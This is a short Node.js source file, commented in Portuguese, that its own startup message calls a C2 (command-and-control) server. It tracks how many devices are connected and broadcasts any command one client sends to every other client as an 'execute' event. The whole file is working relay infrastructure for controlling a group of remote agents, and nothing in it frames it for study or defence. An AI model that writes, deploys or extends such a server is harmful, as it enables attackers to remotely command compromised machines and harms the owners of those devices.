const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

let activeHosts = new Set();

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

function updateHostCount() {
    // Retorna o total de sockets conectados
    const count = io.engine.clientsCount;
    io.emit('host-count', count);
}

io.on('connection', (socket) => {
    console.log('Novo dispositivo conectado:', socket.id);
    updateHostCount(); // Atualiza ao conectar

    socket.on('send-command', (data) => {
        socket.broadcast.emit('execute', data);
    });

    socket.on('disconnect', () => {
        console.log('Dispositivo desconectado');
        updateHostCount(); // Atualiza ao desconectar
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Servidor C2 rodando na porta ${PORT}`));
